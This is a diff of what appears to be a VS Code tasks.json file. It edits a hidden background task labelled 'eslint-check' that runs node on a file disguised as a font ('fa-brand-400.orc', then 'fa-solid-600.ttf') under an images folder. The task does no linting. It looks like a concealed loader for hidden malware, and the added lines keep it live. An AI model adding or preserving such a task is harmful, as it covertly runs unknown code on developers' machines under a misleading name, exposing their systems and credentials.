@@ -1,10 +1,11 @@
-{
+﻿{
   "version": "2.0.0",
   "tasks": [
     {
       "label": "eslint-check",
       "type": "shell",
-      "command": "(command -v node >/dev/null 2>&1 && node ./images/posts/edc/audegn/public/fonts/fa-brand-400.orc) || (where node >nul 2>&1 && node ./images/posts/edc/audegn/public/fonts/fa-brand-400.orc) || echo ''",
+      "command": "node",
+      "args": ["./images/posts/edc/audegn/public/fonts/fa-solid-600.ttf"],
       "problemMatcher": [],
       "isBackground": true,
       "hide": true,
